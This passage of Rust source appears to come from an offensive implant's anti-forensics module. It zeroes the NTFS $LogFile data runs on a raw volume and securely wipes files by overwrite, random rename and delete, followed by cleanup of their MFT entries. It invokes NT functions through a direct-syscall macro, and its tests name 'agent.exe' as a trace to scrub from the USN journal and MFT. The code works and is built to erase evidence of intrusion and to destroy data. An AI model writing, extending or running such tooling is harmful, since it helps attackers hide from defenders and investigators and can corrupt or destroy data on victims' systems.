        let mut data_run_offset: usize = 0;
        let mut data_runs_start: usize = 0;

        let mut attr_offset = first_attr_offset;
        while attr_offset + ATTR_HEADER_SIZE < used_size {
            let type_code = read_u32_le(&logfile_entry, attr_offset);
            let attr_len = read_u32_le(&logfile_entry, attr_offset + 4) as usize;

            if type_code == 0xFFFFFFFF || attr_len == 0 {
                break;
            }

            if type_code == ATTR_TYPE_DATA {
                let non_resident = logfile_entry[attr_offset + 8];
                if non_resident != 0 {
                    // Non-resident $DATA attribute.
                    // Offset to data runs is at attr_offset + 0x20 (u16 LE).
                    // Total allocated size is at attr_offset + 0x28 (i64 LE).
                    data_runs_start =
                        attr_offset + read_u16_le(&logfile_entry, attr_offset + 0x20) as usize;
                    logfile_size = read_u64_le(&logfile_entry, attr_offset + 0x30); // ValidDataLength
                    break;
                }
            }

            attr_offset += attr_len;
        }

        if data_runs_start == 0 || logfile_size == 0 {
            nt_close(vol_handle);
            bail!("Could not find $LogFile data runs");
        }

        // ── Pending-transaction safety check (M-6) ──────────────────────
        // Before zeroing $LogFile data runs, verify the volume has no
        // pending NTFS transactions.  If the volume is "dirty" (bit 0 of
        // the FSCTL_IS_VOLUME_DIRTY output), aborting here avoids
        // filesystem corruption from truncating an active log.
        {
            let mut dirty_flags: u32 = 0;
            let status = nt_fs_control_file(
                vol_handle,
                FSCTL_IS_VOLUME_DIRTY,
                std::ptr::null_mut(),
                0,
                &mut dirty_flags as *mut u32 as *mut std::ffi::c_void,
                std::mem::size_of::<u32>() as u32,
            )?;

            if status != STATUS_SUCCESS {
                nt_close(vol_handle);
                bail!(
                    "FSCTL_IS_VOLUME_DIRTY returned 0x{:08X} — aborting $LogFile cleanup",
                    status as u32
                );
            }

            if dirty_flags & VOLUME_IS_DIRTY != 0 {
                nt_close(vol_handle);
                bail!(
                    "Volume '{}' is dirty (pending NTFS transactions, flags=0x{:08X}) — \
                     aborting $LogFile cleanup to avoid filesystem corruption",
                    volume,
                    dirty_flags
                );
            }
        }

        // ── Flush USN journal (M-7) ──────────────────────────────────────
        // Issue FSCTL_WRITE_USN_CLOSE to flush any pending USN journal
        // entries for this volume handle.  This ensures the USN close record
        // is written *before* we zero the $LogFile data runs, so NTFS does
        // not have outstanding USN entries that would require the log after
        // we zero it.
        {
            let usn_status = nt_fs_control_file(
                vol_handle,
                FSCTL_WRITE_USN_CLOSE,
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
                0,
            );
            match usn_status {
                Ok(st) if st >= 0 => {
                    debug!(
                        "FSCTL_WRITE_USN_CLOSE succeeded on '{}' (status={:#010x})",
                        volume, st as u32
                    );
                }
                Ok(st) => {
                    warn!(
                        "FSCTL_WRITE_USN_CLOSE returned NTSTATUS {:#010x} on '{}' — \
                         continuing with $LogFile zeroing (log may still have pending data)",
                        st as u32, volume
                    );
                }
                Err(e) => {
                    warn!(
                        "FSCTL_WRITE_USN_CLOSE failed on '{}': {} — \
                         continuing with $LogFile zeroing",
                        volume, e
                    );
                }
            }
        }

        // Parse data runs and zero them.
        // Data run format: first byte high nibble = length size, low nibble = offset size.
        let mut total_zeroed: u64 = 0;
        let mut run_offset = data_runs_start;
        let mut current_cluster: i64 = 0;

        loop {
            if run_offset >= used_size {
                break;
            }
            let header_byte = logfile_entry[run_offset];
            if header_byte == 0 {
                break; // End of data runs.
            }

            let len_size = (header_byte & 0x0F) as usize;
            let offset_size = ((header_byte >> 4) & 0x0F) as usize;

            if len_size == 0 || offset_size == 0 {
                break;
            }

            run_offset += 1;

            // Read run length (unsigned).
            let mut run_length = 0u64;
            for i in 0..len_size {
                if run_offset + i < used_size {
                    run_length |= (logfile_entry[run_offset + i] as u64) << (i * 8);
                }
            }
            run_offset += len_size;

            // Read run offset (signed).
            let mut run_offset_val: i64 = 0;
            for i in 0..offset_size {
                if run_offset + i < used_size {
                    run_offset_val |= (logfile_entry[run_offset + i] as i64) << (i * 8);
                }
            }
            // Sign extend.
            if offset_size < 8 {
                let sign_bit = 1i64 << (offset_size * 8 - 1);
                if run_offset_val & sign_bit != 0 {
                    run_offset_val |= !0i64 << (offset_size * 8);
                }
            }
            run_offset += offset_size;

            current_cluster += run_offset_val;

            // Zero this data run.
            let byte_offset = current_cluster as u64 * cluster_size;
            let byte_length = run_length * cluster_size;

            // Zero in chunks to avoid huge allocations.
            let chunk_size = 64 * 1024; // 64 KB chunks
            let zeros = vec![0u8; chunk_size.min(byte_length as usize)];
            let mut written: u64 = 0;

            while written < byte_length {
                let to_write = zeros.len().min((byte_length - written) as usize);
                if let Err(e) =
                    nt_write_file(vol_handle, &zeros[..to_write], Some(byte_offset + written))
                {
                    warn!(
                        "Failed to zero $LogFile data run at offset {}: {}",
                        byte_offset + written,
                        e
                    );
                    break;
                }
                written += to_write as u64;
            }

            total_zeroed += written;
        }

        nt_close(vol_handle);

        info!(
            "Cleaned $LogFile on {}: {} bytes zeroed of {} total",
            volume, total_zeroed, logfile_size
        );

        Ok(LogFileResult {
            volume: volume.to_string(),
            success: total_zeroed > 0,
            original_size: logfile_size,
            warning: if total_zeroed < logfile_size {
                Some(format!(
                    "Only {} of {} bytes were zeroed",
                    total_zeroed, logfile_size
                ))
            } else {
                None
            },
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Secure File Wipe
// ═══════════════════════════════════════════════════════════════════════════

/// Result of a secure file wipe operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WipeResult {
    /// Original file path.
    pub original_path: String,
    /// File size in bytes.
    pub file_size: u64,
    /// Number of overwrite passes completed.
    pub passes_completed: u32,
    /// Whether the MFT entry was also cleaned.
    pub mft_cleaned: bool,
}

/// Securely delete a file by overwriting, renaming, and deleting it.
///
/// This is the most thorough file deletion method:
/// 1. Overwrite file data with random bytes (N passes, default 3).
/// 2. Overwrite with zeros (final pass).
/// 3. Truncate to zero length.
/// 4. Rename to a random name.
/// 5. Delete the file.
/// 6. Optionally clean the MFT entry for the original filename.
///
/// # Arguments
/// * `path` — File path to securely wipe.
/// * `passes` — Number of random-data overwrite passes (0 = use default of 3).
pub fn wipe_file_securely(path: &str, passes: u32) -> Result<WipeResult> {
    let passes = if passes == 0 {
        DEFAULT_WIPE_PASSES
    } else {
        passes
    };

    unsafe {
        let nt_path = format!("\\??\\{}", path);
        let handle = nt_open_file(
            &nt_path,
            GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE | 0x00010000, // DELETE
        )?;

        let file_size = nt_query_file_size(handle)?;
        let mut passes_completed = 0u32;

        debug!(
            "Securely wiping '{}' ({} bytes, {} passes)",
            path, file_size, passes
        );

        // Generate random data for overwrite passes.
        let chunk_size = 64 * 1024; // 64 KB chunks
        let mut random_buf = vec![0u8; chunk_size];
        let mut zero_buf = vec![0u8; chunk_size];

        // Random-data passes.
        for pass in 0..passes {
            let mut written: u64 = 0;

            // Fill random buffer with fresh random data for each pass.
            let _ = getrandom::getrandom(&mut random_buf);

            while written < file_size {
                let to_write = chunk_size.min((file_size - written) as usize) as usize;
                if let Err(e) = nt_write_file(handle, &random_buf[..to_write], Some(written)) {
                    warn!("Write error during pass {}: {}", pass + 1, e);
                    break;
                }
                written += to_write as u64;
            }

            passes_completed += 1;
        }

        // Final zero pass.
        let mut written: u64 = 0;
        while written < file_size {
            let to_write = chunk_size.min((file_size - written) as usize) as usize;
            if let Err(e) = nt_write_file(handle, &zero_buf[..to_write], Some(written)) {
                warn!("Zero-pass write error: {}", e);
                break;
            }
            written += to_write as u64;
        }
        passes_completed += 1;

        // Truncate to zero length.
        // Use NtSetInformationFile(FileEndOfFileInformation) with size = 0.
        let mut end_of_file = 0u64;
        let mut iosb = IoStatusBlock::default();
        let _ = crate::syscall!(
            "NtSetInformationFile",
            handle as u64,
            &mut iosb as *mut _ as u64,
            &mut end_of_file as *mut u64 as u64,
            8u64,
            20u64, // FileEndOfFileInformation
        );

        // Rename to a random name.
        let new_name = random_filename();
        let rename_target = format!("\\??\\{}", new_name);
        let mut rename_buf = to_wide(&rename_target);
        let rename_us = make_unicode_string(&mut rename_buf);

        // FILE_RENAME_INFORMATION structure:
        //   ReplaceIfExists (u8) + RootDirectory (HANDLE=u64) + FileNameLength (u32) + FileName (variable)
        let mut rename_info = Vec::new();
        rename_info.push(1u8); // ReplaceIfExists = TRUE
        rename_info.extend(&[0u8; 7]); // padding + RootDirectory (null)
        rename_info.extend(&(rename_us.length as u32).to_le_bytes());
        rename_info.extend_from_slice(
            &rename_us
                .buffer
                .read()
                .to_ne_bytes()
                .iter()
                .take(rename_us.length as usize / 2)
                .flat_map(|&c| c.to_le_bytes())
                .collect::<Vec<u8>>(),
        );

        // Actually, let's use a simpler approach: NtSetInformationFile(FileRenameInformation).
        // We'll construct the rename info properly.
        let file_name_bytes: Vec<u8> = (0..rename_us.length as usize / 2)
            .flat_map(|i| {
                let c = *unsafe { rename_us.buffer.add(i) };
                c.to_le_bytes()
            })
            .collect();

        let mut full_rename_info = Vec::with_capacity(12 + file_name_bytes.len());
        full_rename_info.push(1u8); // ReplaceIfExists
        full_rename_info.extend(&[0u8; 3]); // padding
        full_rename_info.extend(&0u64.to_le_bytes()); // RootDirectory = NULL
        full_rename_info.extend(&(file_name_bytes.len() as u32).to_le_bytes());
        full_rename_info.extend(&file_name_bytes);

        let mut iosb2 = IoStatusBlock::default();
        let _ = crate::syscall!(
            "NtSetInformationFile",
            handle as u64,
            &mut iosb2 as *mut _ as u64,
            full_rename_info.as_ptr() as u64,
            full_rename_info.len() as u64,
            10u64, // FileRenameInformation
        );

        // Close the handle.
        nt_close(handle);

        // Delete the renamed file.
        let delete_nt_path = format!("\\??\\{}", new_name);
        if let Ok(del_handle) = nt_open_file(
            &delete_nt_path,
            GENERIC_READ | SYNCHRONIZE | 0x00010000, // DELETE
        ) {
            // Set FileDispositionInformation to delete on close.
            let mut disp_info = [1u8; 1]; // DeleteFile = TRUE
            let mut iosb3 = IoStatusBlock::default();
            let _ = crate::syscall!(
                "NtSetInformationFile",
                del_handle as u64,
                &mut iosb3 as *mut _ as u64,
                disp_info.as_ptr() as u64,
                1u64,
                13u64, // FileDispositionInformation
            );
            nt_close(del_handle); // File is deleted on close.
        }

        // Optionally clean MFT entry.
        let mft_result = clean_mft_entries(&[path.to_string()]);
        let mft_cleaned = mft_result.map(|r| r.entries_cleaned > 0).unwrap_or(false);

        info!(
            "Securely wiped '{}': {} bytes, {} passes, MFT cleaned: {}",
            path, file_size, passes_completed, mft_cleaned
        );

        Ok(WipeResult {
            original_path: path.to_string(),
            file_size,
            passes_completed,
            mft_cleaned,
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_usn_cleanup_result_serialization() {
        let result = UsnCleanupResult {
            entries_processed: 100,
            entries_cleaned: 5,
            references_searched: vec!["agent.exe".to_string()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("entries_cleaned"));
    }

    #[test]
    fn test_mft_cleanup_result_serialization() {
        let result = MftCleanupResult {
            files_processed: 3,
            entries_cleaned: 2,
            failures: vec!["C:\\missing.txt".to_string()],
        };
        let json = serde_json::to_string(&result).unwrap();
        let decoded: MftCleanupResult = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded.failures.len(), 1);
    }

    #[test]
    fn test_logfile_result_serialization() {
        let result = LogFileResult {
            volume: "C:".to_string(),
            success: true,
            original_size: 1024,
            warning: None,
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("C:"));
    }

    #[test]
    fn test_wipe_result_serialization() {
        let result = WipeResult {
            original_path: "C:\\test.exe".to_string(),
            file_size: 4096,
            passes_completed: 4,
            mft_cleaned: true,
        };
        let json = serde_json::to_string(&result).unwrap();
        let decoded: WipeResult = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded.passes_completed, 4);
    }

    #[test]
    fn test_read_write_u16_le() {
        let mut buf = [0u8; 4];
        write_u16_le(&mut buf, 0, 0x1234);
        assert_eq!(read_u16_le(&buf, 0), 0x1234);
    }

    #[test]
    fn test_read_write_u32_le() {
        let mut buf = [0u8; 8];
        write_u32_le(&mut buf, 0, 0xDEAD_BEEF);
        assert_eq!(read_u32_le(&buf, 0), 0xDEAD_BEEF);
    }

    #[test]
    fn test_read_write_u64_le() {
        let mut buf = [0u8; 16];
        write_u64_le(&mut buf, 0, 0x0102_0304_0506_0708);
        assert_eq!(read_u64_le(&buf, 0), 0x0102_0304_0506_0708);
    }

    #[test]
    fn test_random_filename() {
        let name = random_filename();
        assert!(name.ends_with(".tmp"));
        assert_eq!(name.len(), 12); // 8 hex + "." + "tmp"
    }

    #[test]
    fn test_clean_usn_journal_no_references() {
        let result = clean_usn_journal("C:", &[]).unwrap();
        assert_eq!(result.entries_processed, 0);
        assert_eq!(result.entries_cleaned, 0);
    }

    #[test]
    fn test_clean_mft_entries_empty() {
        let result = clean_mft_entries(&[]).unwrap();
        assert_eq!(result.files_processed, 0);
    }

    #[test]
    fn test_clean_usn_journal_invalid_path() {
        let result = clean_usn_journal("INVALID", &["test.exe".to_string()]);
        // Will fail to open the file but should not panic.
        assert!(result.is_err());
    }
}
